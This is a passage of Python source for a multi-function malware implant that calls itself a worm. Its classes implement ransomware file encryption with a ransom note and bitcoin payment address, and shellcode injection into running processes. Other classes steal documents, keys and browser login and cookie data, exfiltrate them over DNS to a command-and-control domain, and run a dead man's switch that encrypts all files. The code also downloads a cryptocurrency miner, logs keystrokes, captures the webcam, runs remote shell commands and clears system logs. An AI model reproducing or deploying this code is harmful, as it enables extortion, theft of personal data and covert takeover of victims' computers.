                if self._decrypt_single_file(file_path, fernet):
                    decrypted_count += 1
                    if decrypted_count % 10 == 0:
                        print(f"🔓 Decrypted {decrypted_count} files...")
                
            except Exception as e:
                debug_log(f"Failed to decrypt {file_path}: {e}", "ERROR")
        
        print(f"\n✅ Decrypted {decrypted_count} files!")
        return True
    
    def encrypt_specific(self, file_paths, password=None):
        return self.encrypt_files(password=password, file_paths=file_paths)
    
    def decrypt_specific(self, file_paths, password=None):
        return self.decrypt_files(password=password, file_paths=file_paths)
    
    def encrypt_directory(self, directory, password=None, recursive=True):
        return self.encrypt_files(password=password, directory=directory, recursive=recursive)
    
    def decrypt_directory(self, directory, password=None, recursive=True):
        return self.decrypt_files(password=password, directory=directory, recursive=recursive)
    
    def get_encrypted_files(self):
        return self.encrypted_file_list
    
    def get_encryption_stats(self):
        return {
            'total_encrypted': len(self.encrypted_file_list),
            'extension': self.encrypted_ext,
            'host_id': self.host_id,
            'files_encrypted': self.files_encrypted,
            'processed_count': self.processed_count,
            'last_file': self.last_file
        }

# ============================================================
# PROCESS INJECTION
# ============================================================

class ProcessInjector:
    """Inject code into running processes"""
    
    @staticmethod
    def inject_to_process(pid):
        """Inject code into a running process"""
        try:
            if OSDetector.is_windows():
                import ctypes
                from ctypes import wintypes
                
                kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
                user32 = ctypes.WinDLL('user32', use_last_error=True)
                
                PROCESS_ALL_ACCESS = 0x1F0FFF
                MEM_COMMIT = 0x1000
                MEM_RESERVE = 0x2000
                PAGE_EXECUTE_READWRITE = 0x40
                
                # Open process
                hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
                if not hProcess:
                    debug_log(f"Failed to open process {pid}")
                    return False
                
                # Allocate memory
                shellcode = b"\x90" * 100  # NOP sled
                shellcode += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  # execve shellcode
                
                addr = kernel32.VirtualAllocEx(
                    hProcess,
                    None,
                    len(shellcode),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE
                )
                
                if not addr:
                    debug_log("Memory allocation failed")
                    kernel32.CloseHandle(hProcess)
                    return False
                
                # Write shellcode
                written = wintypes.SIZE_T()
                kernel32.WriteProcessMemory(
                    hProcess,
                    addr,
                    shellcode,
                    len(shellcode),
                    ctypes.byref(written)
                )
                
                # Create remote thread
                thread_id = wintypes.DWORD()
                kernel32.CreateRemoteThread(
                    hProcess,
                    None,
                    0,
                    addr,
                    None,
                    0,
                    ctypes.byref(thread_id)
                )
                
                kernel32.CloseHandle(hProcess)
                debug_log(f"✅ Injected into process {pid}")
                return True
                
            else:
                # Linux - use ptrace or gdb
                try:
                    subprocess.run(['gdb', '-p', str(pid), '-batch', '-ex', 'call system("/bin/sh")'], 
                                  capture_output=True, timeout=5)
                    debug_log(f"✅ Injected into process {pid} via gdb")
                    return True
                except:
                    debug_log(f"Failed to inject into process {pid}")
                    return False
                    
        except Exception as e:
            debug_log(f"Injection error: {e}", "ERROR")
            return False
    
    @staticmethod
    def inject_shellcode(pid, shellcode):
        """Inject custom shellcode into process"""
        if OSDetector.is_windows():
            import ctypes
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            PROCESS_ALL_ACCESS = 0x1F0FFF
            MEM_COMMIT = 0x1000
            MEM_RESERVE = 0x2000
            PAGE_EXECUTE_READWRITE = 0x40
            
            hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not hProcess:
                return False
            
            addr = kernel32.VirtualAllocEx(
                hProcess,
                None,
                len(shellcode),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not addr:
                kernel32.CloseHandle(hProcess)
                return False
            
            written = ctypes.c_size_t()
            kernel32.WriteProcessMemory(
                hProcess,
                addr,
                shellcode,
                len(shellcode),
                ctypes.byref(written)
            )
            
            thread_id = ctypes.c_ulong()
            kernel32.CreateRemoteThread(
                hProcess,
                None,
                0,
                addr,
                None,
                0,
                ctypes.byref(thread_id)
            )
            
            kernel32.CloseHandle(hProcess)
            return True
        return False

# ============================================================
# DATA EXFILTRATION
# ============================================================

class DataExfiltrator:
    """Exfiltrate data before encryption"""
    
    def __init__(self, db=None, c2=None):
        self.db = db or StealthDatabase()
        self.c2 = c2
        self.target_extensions = [
            '*.doc', '*.docx', '*.xls', '*.xlsx', '*.pdf', '*.txt',
            '*.key', '*.pem', '*.crt', '*.ppk', '*.p12',
            '*.sqlite', '*.db', '*.sql',
            '*.wallet', '*.dat', '*.conf', '*.config',
            '*.json', '*.xml', '*.yaml', '*.yml',
            '*.jpg', '*.png', '*.gif', '*.bmp',
            '*.zip', '*.rar', '*.7z', '*.tar.gz'
        ]
    
    def steal_files(self, max_files=100):
        """Steal important files before encryption"""
        debug_log("Starting data exfiltration")
        stolen_files = []
        
        home = os.path.expanduser('~')
        for pattern in self.target_extensions:
            try:
                for file_path in glob.glob(os.path.join(home, '**', pattern), recursive=True):
                    if len(stolen_files) >= max_files:
                        break
                    
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size > 1024 * 1024 * 10:  # Skip > 10MB
                            continue
                        
                        with open(file_path, 'rb') as f:
                            data = f.read()
                        
                        # Store in DB
                        self.db.add_exfiltrated_data(file_path, data)
                        stolen_files.append(file_path)
                        debug_log(f"Exfiltrated: {file_path}")
                        
                        # Send to C2 if available
                        if self.c2:
                            self.c2.send_beacon({
                                'type': 'exfiltrated_file',
                                'path': file_path,
                                'size': len(data),
                                'data': base64.b64encode(data).decode()[:1000]  # Truncate for beacon
                            })
                        
                    except Exception as e:
                        debug_log(f"Failed to steal {file_path}: {e}", "ERROR")
                
                if len(stolen_files) >= max_files:
                    break
                    
            except Exception as e:
                debug_log(f"Glob error for {pattern}: {e}", "ERROR")
        
        debug_log(f"Stolen {len(stolen_files)} files")
        return stolen_files
    
    def steal_browser_data(self):
        """Steal browser passwords and cookies"""
        stolen_data = []
        
        browser_paths = {
            'chrome': {
                'windows': os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Default'),
                'linux': os.path.expanduser('~/.config/google-chrome/Default'),
                'macos': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default')
            },
            'firefox': {
                'windows': os.path.expanduser('~/AppData/Roaming/Mozilla/Firefox/Profiles'),
                'linux': os.path.expanduser('~/.mozilla/firefox'),
                'macos': os.path.expanduser('~/Library/Application Support/Firefox/Profiles')
            }
        }
        
        os_type = OSDetector.get_os()
        
        for browser, paths in browser_paths.items():
            path = paths.get(os_type, paths.get('linux'))
            if os.path.exists(path):
                try:
                    # Look for login data or cookies
                    if browser == 'chrome':
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                if file in ['Login Data', 'Cookies']:
                                    file_path = os.path.join(root, file)
                                    try:
                                        shutil.copy2(file_path, tempfile.gettempdir() + f'/{browser}_{file}')
                                        stolen_data.append(file_path)
                                        debug_log(f"Stole {browser} {file}")
                                    except:
                                        pass
                except Exception as e:
                    debug_log(f"Error stealing {browser} data: {e}", "ERROR")
        
        return stolen_data

# ============================================================
# ENHANCED C2 WITH ENCRYPTION
# ============================================================

class SecureC2:
    """Encrypted C2 communication"""
    
    def __init__(self, db=None):
        self.db = db or StealthDatabase()
        self.c2_domain = C2_SERVER
        self.public_key = C2_PUBLIC_KEY
        self.session_key = None
        self.last_heartbeat = None
    
    def send_encrypted(self, data):
        """Send encrypted data to C2"""
        try:
            if self.public_key:
                from cryptography.hazmat.primitives.asymmetric import rsa, padding
                from cryptography.hazmat.primitives import hashes
                
                public_key = rsa.load_pem_public_key(self.public_key.encode())
                encrypted = public_key.encrypt(
                    json.dumps(data).encode(),
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                encoded = base64.b64encode(encrypted).decode()
                
                # Send via DNS
                chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
                for chunk in chunks[:3]:
                    domain = f"{chunk}.secure.{self.c2_domain}"
                    socket.gethostbyname(domain)
                
                debug_log("Encrypted C2 message sent")
                return True
            else:
                # Fallback to regular beacon
                return self.send_beacon(data)
                
        except Exception as e:
            debug_log(f"Encrypted C2 send failed: {e}", "ERROR")
            return False
    
    def send_beacon(self, data):
        """Send beacon via DNS"""
        try:
            encoded = base64.b64encode(json.dumps(data).encode()).decode()
            chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
            for chunk in chunks[:3]:
                domain = f"{chunk}.beacon.{self.c2_domain}"
                socket.gethostbyname(domain)
            self.last_heartbeat = time.time()
            debug_log(f"Beacon sent: {data.get('type', 'unknown')}")
            return True
        except Exception as e:
            debug_log(f"Beacon failed: {e}", "ERROR")
            return False
    
    def receive_commands(self):
        """Receive commands via DNS"""
        try:
            import dns.resolver
            answers = dns.resolver.resolve(f"cmd.{self.c2_domain}", 'TXT')
            for answer in answers:
                for txt in answer.strings:
                    try:
                        command = json.loads(base64.b64decode(txt).decode())
                        debug_log(f"Command received: {command.get('cmd', 'unknown')}")
                        return command
                    except:
                        pass
        except:
            pass
        return None

# ============================================================
# DEAD MAN'S SWITCH
# ============================================================

class DeadManSwitch:
    """Execute fallback if no C2 heartbeat"""
    
    def __init__(self, worm):
        self.worm = worm
        self.last_heartbeat = time.time()
        self.heartbeat_timeout = 3600 * 24  # 24 hours
        self.active = True
    
    def check_heartbeat(self):
        """Check if heartbeat was received"""
        if self.active and (time.time() - self.last_heartbeat) > self.heartbeat_timeout:
            debug_log("⚠️ Dead man's switch triggered - no heartbeat for 24 hours")
            self.execute_fallback()
            return True
        return False
    
    def update_heartbeat(self):
        """Update last heartbeat time"""
        self.last_heartbeat = time.time()
    
    def execute_fallback(self):
        """Execute fallback actions"""
        debug_log("💀 Executing dead man's switch fallback")
        
        # Encrypt everything
        self.worm.ransomware.encrypt_files(password='fallback_encryption_key')
        
        # Display ransom note
        self.worm.command_handler.handle_display_ransom_note({})
        
        # Send final beacon
        self.worm.c2.send_beacon({
            'type': 'dead_man_switch',
            'host_id': self.worm.ransomware.host_id,
            'timestamp': datetime.now().isoformat()
        })
        
        # Start cryptocurrency miner if configured
        if hasattr(self.worm, 'miner'):
            self.worm.miner.start_mining()
        
        self.active = False

# ============================================================
# CRYPTOCURRENCY MINER (FALLBACK)
# ============================================================

class CryptoMiner:
    """Cryptocurrency miner as fallback"""
    
    def __init__(self, wallet_address=None):
        self.wallet_address = wallet_address or '49cpNtWp6mHnXGk6LWn5bLRgW5sDQHvvFJ'
        self.mining = False
        self.miner_process = None
    
    def start_mining(self):
        """Start cryptocurrency mining"""
        if self.mining:
            return False
        
        debug_log("Starting cryptocurrency miner")
        
        try:
            # Try to download and run XMRig
            if OSDetector.is_windows():
                url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-msvc-win64.zip'
                zip_path = os.path.join(tempfile.gettempdir(), 'xmrig.zip')
                subprocess.run(['curl', '-L', '-o', zip_path, url])
                # Extract and run
                self.miner_process = subprocess.Popen([
                    'xmrig.exe',
                    '-o', 'pool.supportxmr.com:443',
                    '-u', self.wallet_address,
                    '-k', '--tls'
                ])
            elif OSDetector.is_linux():
                url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz'
                # Download and run
                self.miner_process = subprocess.Popen([
                    './xmrig',
                    '-o', 'pool.supportxmr.com:443',
                    '-u', self.wallet_address,
                    '-k', '--tls'
                ])
            else:
                # macOS
                url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-macos-x64.tar.gz'
                self.miner_process = subprocess.Popen([
                    './xmrig',
                    '-o', 'pool.supportxmr.com:443',
                    '-u', self.wallet_address,
                    '-k', '--tls'
                ])
            
            self.mining = True
            debug_log("✅ Miner started")
            return True
            
        except Exception as e:
            debug_log(f"Failed to start miner: {e}", "ERROR")
            return False
    
    def stop_mining(self):
        """Stop cryptocurrency mining"""
        if self.miner_process:
            self.miner_process.terminate()
            self.mining = False
            debug_log("Miner stopped")
            return True
        return False

# ============================================================
# ENHANCED C2 COMMAND HANDLER
# ============================================================

class C2CommandHandler:
    """Complete C2 command handler with all features"""
    
    def __init__(self, worm):
        debug_log("Initializing C2CommandHandler")
        self.worm = worm
        self.db = worm.db
        self.ransomware = worm.ransomware
        self.keylogger = worm.keylogger
        self.webcam = worm.webcam
        self.os_type = OSDetector.get_os()
        self.injector = ProcessInjector()
        self.exfiltrator = DataExfiltrator(self.db, worm.c2)
        self.miner = CryptoMiner()
        
        # State
        self.propagation_active = True
        self.ransom_amount = "0.5"
        self.ransom_currency = "BTC"
        self.payment_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    
    def handle_command(self, command_data):
        """Main command dispatcher"""
        cmd_type = command_data.get('cmd')
        params = command_data.get('params', {})
        command_id = command_data.get('id', str(uuid.uuid4())[:8])
        
        debug_log(f"📨 Command: {cmd_type} (ID: {command_id})")
        print(f"📨 Command: {cmd_type} (ID: {command_id})")
        
        handlers = {
            # Core
            'status': self.handle_status,
            'heartbeat': self.handle_heartbeat,
            'self_destruct': self.handle_self_destruct,
            
            # Encryption
            'encrypt': self.handle_encrypt,
            'encrypt_files': self.handle_encrypt_files,
            'encrypt_directory': self.handle_encrypt_directory,
            'decrypt': self.handle_decrypt,
            'decrypt_files': self.handle_decrypt_files,
            'decrypt_directory': self.handle_decrypt_directory,
            'encryption_status': self.handle_encryption_status,
            'encryption_stats': self.handle_encryption_stats,
            
            # Keylogger
            'keylog_start': self.handle_keylog_start,
            'keylog_stop': self.handle_keylog_stop,
            'keylog_status': self.handle_keylog_status,
            'keylog_download': self.handle_keylog_download,
            'keylog_clear': self.handle_keylog_clear,
            
            # Webcam
            'webcam_capture': self.handle_webcam_capture,
            'webcam_stream': self.handle_webcam_stream,
            'webcam_status': self.handle_webcam_status,
            'webcam_release': self.handle_webcam_release,
            
            # Remote Control
            'screen_share': self.handle_screen_share,
            'mouse_control': self.handle_mouse_control,
            'keyboard_control': self.handle_keyboard_control,
            'block_computer': self.handle_block_computer,
            
            # Data Collection
            'collect_data': self.handle_collect_data,
            'screenshot': self.handle_screenshot,
            'download_file': self.handle_download_file,
            'upload_file': self.handle_upload_file,
            
            # Execution
            'execute': self.handle_execute,
            'list_processes': self.handle_list_processes,
            'kill_process': self.handle_kill_process,
            'inject_process': self.handle_inject_process,
            
            # File System
            'file_search': self.handle_file_search,
            'directory_list': self.handle_directory_list,
            
            # Persistence
            'install_persistence': self.handle_install_persistence,
            'persistence_status': self.handle_persistence_status,
            
            # Network
            'port_scan': self.handle_port_scan,
            
            # Ransomware
            'display_ransom_note': self.handle_display_ransom_note,
            'change_ransom_amount': self.handle_change_ransom_amount,
            'change_payment_address': self.handle_change_payment_address,
            'deadline': self.handle_deadline,
            
            # Data Exfiltration
            'exfiltrate': self.handle_exfiltrate,
            'steal_browser': self.handle_steal_browser,
            
            # Mining
            'start_mining': self.handle_start_mining,
            'stop_mining': self.handle_stop_mining,
            'mining_status': self.handle_mining_status,
            
            # Anti-VM
            'check_environment': self.handle_check_environment,
            
            # Misc
            'get_os_info': self.handle_get_os_info,
            'get_stats': self.handle_get_stats,
            'clear_logs': self.handle_clear_logs,
            'bypass_uac': self.handle_bypass_uac
        }
        
        handler = handlers.get(cmd_type)
        if handler:
            try:
                result = handler(params)
                response = {'status': 'success', 'result': result}
                self._send_response(command_id, response)
                debug_log(f"✅ Command {cmd_type} executed successfully")
                return response
            except Exception as e:
                error_msg = f"Error executing {cmd_type}: {e}"
                debug_log(error_msg, "ERROR")
                response = {'status': 'error', 'error': str(e)}
                self._send_response(command_id, response)
                return response
        else:
            error_msg = f"Unknown command: {cmd_type}"
            debug_log(error_msg, "ERROR")
            response = {'status': 'error', 'error': error_msg}
            self._send_response(command_id, response)
            return response
    
    def _send_response(self, command_id, response):
        response_data = {
            'command_id': command_id,
            'response': response,
            'timestamp': datetime.now().isoformat()
        }
        self.worm.c2.send_beacon(response_data)
    
    # ============================================================
    # ENCRYPTION COMMAND HANDLERS
    # ============================================================
    
    def handle_encrypt(self, params):
        password = params.get('password')
        threading.Thread(target=self.ransomware.encrypt_files, args=(password,)).start()
        return {'status': 'encryption_started', 'mode': 'all_files'}
    
    def handle_encrypt_files(self, params):
        file_paths = params.get('file_paths', [])
        password = params.get('password')
        
        if not file_paths:
            return {'error': 'No file paths provided'}
        
        def encrypt_specific():
            self.ransomware.encrypt_files(password=password, file_paths=file_paths)
        
        threading.Thread(target=encrypt_specific).start()
        
        return {
            'status': 'encryption_started', 
            'mode': 'specific_files',
            'file_count': len(file_paths),
            'files': file_paths
        }
    
    def handle_encrypt_directory(self, params):
        directory = params.get('directory')
        password = params.get('password')
        recursive = params.get('recursive', True)
        
        if not directory:
            return {'error': 'No directory provided'}
        
        if not os.path.isdir(directory):
            return {'error': f'Directory not found: {directory}'}
        
        def encrypt_dir():
            self.ransomware.encrypt_directory(
                directory=directory,
                password=password,
                recursive=recursive
            )
        
        threading.Thread(target=encrypt_dir).start()
        
        return {
            'status': 'encryption_started',
            'mode': 'directory',
            'directory': directory,
            'recursive': recursive
        }
    
    def handle_decrypt_files(self, params):
        file_paths = params.get('file_paths', [])
        password = params.get('password')
        
        if not file_paths:
            return {'error': 'No file paths provided'}
        
        def decrypt_specific():
            self.ransomware.decrypt_files(password=password, file_paths=file_paths)
        
        threading.Thread(target=decrypt_specific).start()
        
        return {
            'status': 'decryption_started',
            'mode': 'specific_files',
            'file_count': len(file_paths)
        }
    
    def handle_decrypt_directory(self, params):
        directory = params.get('directory')
        password = params.get('password')
        recursive = params.get('recursive', True)
        
        if not directory:
            return {'error': 'No directory provided'}
        
        if not os.path.isdir(directory):
            return {'error': f'Directory not found: {directory}'}
        
        def decrypt_dir():
            self.ransomware.decrypt_directory(
                directory=directory,
                password=password,
                recursive=recursive
            )
        
        threading.Thread(target=decrypt_dir).start()
        
        return {
            'status': 'decryption_started',
            'mode': 'directory',
            'directory': directory,
            'recursive': recursive
        }
    
    def handle_encryption_stats(self, params):
        return self.ransomware.get_encryption_stats()
    
    def handle_decrypt(self, params):
        password = params.get('password')
        threading.Thread(target=self.ransomware.decrypt_files, args=(password,)).start()
        return {'status': 'decryption_started', 'mode': 'all_files'}
    
    def handle_encryption_status(self, params):
        return {
            'files_encrypted': self.ransomware.files_encrypted,
            'extension': self.ransomware.encrypted_ext,
            'host_id': self.ransomware.host_id,
            'encrypted_file_count': len(self.ransomware.encrypted_file_list),
            'processed_count': self.ransomware.processed_count
        }
    
    # ============================================================
    # PROCESS INJECTION
    # ============================================================
    
    def handle_inject_process(self, params):
        pid = params.get('pid')
        shellcode = params.get('shellcode', '').encode()
        
        if not pid:
            return {'error': 'No PID provided'}
        
        if shellcode:
            success = self.injector.inject_shellcode(pid, shellcode)
        else:
            success = self.injector.inject_to_process(pid)
        
        return {'status': 'injection_attempted', 'success': success, 'pid': pid}
    
    # ============================================================
    # DATA EXFILTRATION
    # ============================================================
    
    def handle_exfiltrate(self, params):
        max_files = params.get('max_files', 100)
        stolen = self.exfiltrator.steal_files(max_files)
        return {
            'status': 'exfiltration_complete',
            'files_stolen': len(stolen),
            'stolen_files': stolen[:10]  # Show first 10
        }
    
    def handle_steal_browser(self, params):
        stolen = self.exfiltrator.steal_browser_data()
        return {
            'status': 'browser_data_stolen',
            'files_stolen': len(stolen),
            'stolen_files': stolen
        }
    
    # ============================================================
    # CRYPTOCURRENCY MINING
    # ============================================================
    
    def handle_start_mining(self, params):
        wallet = params.get('wallet_address')
        if wallet:
            self.miner.wallet_address = wallet
        success = self.miner.start_mining()
        return {'status': 'mining_started', 'success': success}
    
    def handle_stop_mining(self, params):
        success = self.miner.stop_mining()
        return {'status': 'mining_stopped', 'success': success}
    
    def handle_mining_status(self, params):
        return {
            'is_mining': self.miner.mining,
            'wallet_address': self.miner.wallet_address
        }
    
    # ============================================================
    # ANTI-VM
    # ============================================================
    
    def handle_check_environment(self, params):
        is_vm = AntiVMDetector.check_environment()
        return {
            'is_vm': is_vm,
            'os': self.os_type,
            'timestamp': datetime.now().isoformat()
        }
    
    # ============================================================
    # LOG CLEARING
    # ============================================================
    
    def handle_clear_logs(self, params):
        if OSDetector.is_windows():
            try:
                subprocess.run(['wevtutil', 'cl', 'System'], capture_output=True)
                subprocess.run(['wevtutil', 'cl', 'Security'], capture_output=True)
                subprocess.run(['wevtutil', 'cl', 'Application'], capture_output=True)
                return {'status': 'logs_cleared', 'os': 'windows'}
            except Exception as e:
                return {'error': str(e)}
        else:
            try:
                subprocess.run(['sudo', 'rm', '-rf', '/var/log/*'], capture_output=True)
                subprocess.run(['sudo', 'journalctl', '--rotate'], capture_output=True)
                subprocess.run(['sudo', 'journalctl', '--vacuum-size=1M'], capture_output=True)
                return {'status': 'logs_cleared', 'os': 'linux/macos'}
            except Exception as e:
                return {'error': str(e)}
    
    # ============================================================
    # UAC BYPASS
    # ============================================================
    
    def handle_bypass_uac(self, params):
        if OSDetector.is_windows():
            try:
                import ctypes
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                return {'status': 'uac_bypass_attempted'}
            except Exception as e:
                return {'error': str(e)}
        else:
            return {'error': 'UAC bypass only available on Windows'}
    
    # ============================================================
    # OTHER COMMAND HANDLERS
    # ============================================================
    
    def handle_status(self, params):
        stats = self.db.get_stats()
        encryption_stats = self.ransomware.get_encryption_stats()
        return {
            'host_id': self.ransomware.host_id,
            'version': '5.0',
            'os': self.os_type,
            'os_version': OSDetector.get_os_version(),
            'architecture': OSDetector.get_architecture(),
            'files_encrypted': self.ransomware.files_encrypted,
            'encrypted_file_count': len(self.ransomware.encrypted_file_list),
            'keylogger_active': self.keylogger.is_active,
            'webcam_available': self.webcam.capture is not None,
            'mining_active': self.miner.mining,
            'stats': stats,
            'encryption_stats': encryption_stats,
            'timestamp': datetime.now().isoformat()
        }
    
    def handle_heartbeat(self, params):
        return {'status': 'alive', 'timestamp': datetime.now().isoformat()}
    
    def handle_self_destruct(self, params):
        if params.get('confirm') == True:
            threading.Thread(target=self._do_self_destruct).start()
            return {'status': 'self_destruct_initiated'}
        return {'error': 'Confirmation required'}
    
    def _do_self_destruct(self):
        debug_log("💣 Self destructing...")
        try:
            if os.path.exists(CONFIG_DIR):
                shutil.rmtree(CONFIG_DIR)
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
            if os.path.exists(CHECKPOINT_FILE):
                os.remove(CHECKPOINT_FILE)
            sys.exit(0)
        except:
            pass
    
    def handle_keylog_start(self, params):
        duration = params.get('duration', 0)
        
        if self.keylogger.start():
            if duration > 0:
                def stop_after_duration():
                    time.sleep(duration)
                    self.keylogger.stop()
                threading.Thread(target=stop_after_duration, daemon=True).start()
            
            return {
                'status': 'keylogger_started',
                'duration': duration,
                'os': self.os_type
            }
        else:
            return {'error': 'Failed to start keylogger'}
    
    def handle_keylog_stop(self, params):
        if self.keylogger.stop():
            stats = self.keylogger.get_stats()
            return {
                'status': 'keylogger_stopped',
                'total_keys': stats['total_keys']
            }
        else:
            return {'error': 'Failed to stop keylogger'}
    
    def handle_keylog_status(self, params):
        stats = self.keylogger.get_stats()
        return {
            'is_active': stats['is_active'],
            'total_keys': stats['total_keys'],
            'os_type': stats['os_type']
        }
    
    def handle_keylog_download(self, params):
        limit = params.get('limit', 1000)
        logs = self.keylogger.get_logs(limit)
        return {
            'total_entries': len(self.keylogger.log_data),
            'entries': logs
        }
    
    def handle_keylog_clear(self, params):
        self.keylogger.log_data = []
        return {'status': 'cleared'}
    
    def handle_webcam_capture(self, params):
        frame = self.webcam.capture_frame()
        if frame:
            return {
                'status': 'success',
                'frame': frame[:500] + '...' if len(frame) > 500 else frame,
                'timestamp': datetime.now().isoformat()
            }
        else:
            return {'error': 'Failed to capture webcam'}
    
    def handle_webcam_stream(self, params):
        duration = params.get('duration', 10)
        frame_rate = params.get('frame_rate', 5)
        
        frames = self.webcam.stream_frames(duration, frame_rate)
        if frames:
            return {
                'status': 'success',
                'frames': [{'timestamp': f['timestamp']} for f in frames],
                'count': len(frames),
                'duration': duration
            }
        else:
            return {'error': 'Failed to stream webcam'}
    
    def handle_webcam_status(self, params):
        return {
            'is_active': self.webcam.capture is not None,
            'os_type': self.os_type
        }
    
    def handle_webcam_release(self, params):
        self.webcam.release()
        return {'status': 'released'}
    
    def handle_screen_share(self, params):
        try:
            import pyautogui
            import io
            from PIL import Image
            
            screenshot = pyautogui.screenshot()
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='JPEG', quality=50)
            encoded = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
            
            return {
                'status': 'success',
                'frame': encoded[:500] + '...' if len(encoded) > 500 else encoded,
                'timestamp': datetime.now().isoformat()
            }
        except:
            return {'error': 'Screen capture not available'}
    
    def handle_mouse_control(self, params):
        try:
            import pyautogui
            action = params.get('action')
            
            if action == 'move':
                x, y = params.get('x', 0), params.get('y', 0)
                pyautogui.moveTo(x, y)
                return {'status': 'moved', 'x': x, 'y': y}
            elif action == 'click':
                button = params.get('button', 'left')
                pyautogui.click(button=button)
                return {'status': 'clicked', 'button': button}
            else:
                return {'error': f'Unknown action: {action}'}
        except:
            return {'error': 'Mouse control not available'}
    
    def handle_keyboard_control(self, params):
        try:
            import pyautogui
            action = params.get('action')
            
            if action == 'write':
                text = params.get('text', '')
                pyautogui.write(text)
                return {'status': 'written', 'length': len(text)}
            elif action == 'press':
                key = params.get('key', '')
                pyautogui.press(key)
                return {'status': 'pressed', 'key': key}
            else:
                return {'error': f'Unknown action: {action}'}
        except:
            return {'error': 'Keyboard control not available'}
    
    def handle_block_computer(self, params):
        action = params.get('action', 'lock')
        
        if action == 'lock':
            try:
                if self.os_type == 'windows':
                    import ctypes
                    ctypes.windll.user32.LockWorkStation()
                elif self.os_type == 'darwin':
                    subprocess.run(['pmset', 'displaysleepnow'])
                else:
                    subprocess.run(['gnome-screensaver-command', '-l'])
                return {'status': 'locked'}
            except:
                return {'error': 'Failed to lock'}
        else:
            return {'error': f'Unknown action: {action}'}
    
    def handle_collect_data(self, params):
        data_type = params.get('type', 'system_info')
        data = self._collect_system_data(data_type)
        self.db.add_collected_data(self.ransomware.host_id, data_type, data)
        return {'status': 'success', 'data': data}
    
    def _collect_system_data(self, data_type):
        if data_type == 'system_info':
            return {
                'hostname': socket.gethostname(),
                'os': platform.platform(),
                'user': os.getlogin(),
                'cwd': os.getcwd(),
                'timestamp': datetime.now().isoformat()
            }
        elif data_type == 'file_list':
            files = []
            for item in os.listdir('.')[:50]:
                try:
                    files.append({
                        'name': item,
                        'size': os.path.getsize(item) if os.path.isfile(item) else 0
                    })
                except:
                    pass
            return {'files': files}
        return {'error': f'Unknown type: {data_type}'}
    
    def handle_screenshot(self, params):
        try:
            import pyautogui
            import io
            from PIL import Image
            
            screenshot = pyautogui.screenshot()
            img_buffer = io.BytesIO()
            screenshot.save(img_buffer, format='JPEG')
            encoded = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
            
            return {
                'status': 'success',
                'screenshot': encoded[:500] + '...' if len(encoded) > 500 else encoded
            }
        except:
            return {'error': 'Screenshot not available'}
    
    def handle_download_file(self, params):
        remote_path = params.get('remote_path')
        if not remote_path or not os.path.exists(remote_path):
            return {'error': 'File not found'}
        try:
            with open(remote_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode('utf-8')
            return {
                'path': remote_path,
                'size': os.path.getsize(remote_path),
                'content': content[:500] + '...' if len(content) > 500 else content
            }
        except Exception as e:
            return {'error': str(e)}
    
    def handle_upload_file(self, params):
        local_path = params.get('local_path')
        remote_path = params.get('remote_path', local_path)
        if not local_path or not os.path.exists(local_path):
            return {'error': 'Local file not found'}
        try:
            shutil.copy2(local_path, remote_path)
            return {'status': 'success', 'remote_path': remote_path}
        except Exception as e:
            return {'error': str(e)}
    
    def handle_execute(self, params):
        command = params.get('command')
        if not command:
            return {'error': 'No command specified'}
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except Exception as e:
            return {'error': str(e)}
    
    def handle_list_processes(self, params):
        processes = []
        try:
            if self.os_type == 'windows':
                result = subprocess.run(['tasklist'], capture_output=True, text=True)
                for line in result.stdout.split('\n')[3:20]:
                    if line.strip():
                        parts = line.split()
                        if len(parts) > 1:
                            processes.append({'name': parts[0], 'pid': parts[1]})
            else:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                for line in result.stdout.split('\n')[1:20]:
                    if line.strip():
                        parts = line.split()
                        if len(parts) > 1:
                            processes.append({
                                'name': parts[10] if len(parts) > 10 else parts[0],
                                'pid': parts[1]
                            })
        except:
            pass
        return {'processes': processes}
    
    def handle_kill_process(self, params):
        pid = params.get('pid')
        if pid:
            try:
                if self.os_type == 'windows':
                    subprocess.run(['taskkill', '/F', '/PID', str(pid)], check=True)
                else:
                    subprocess.run(['kill', '-9', str(pid)], check=True)
                return {'status': 'killed', 'pid': pid}
            except Exception as e:
                return {'error': str(e)}
        return {'error': 'No PID specified'}
    
    def handle_file_search(self, params):
        pattern = params.get('pattern')
        search_path = params.get('path', os.path.expanduser('~'))
        if not pattern:
            return {'error': 'Pattern required'}
        results = []
        try:
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if re.search(pattern, file, re.IGNORECASE):
                        results.append(os.path.join(root, file))
                        if len(results) >= 50:
                            return {'results': results}
        except:
            pass
        return {'results': results}
    
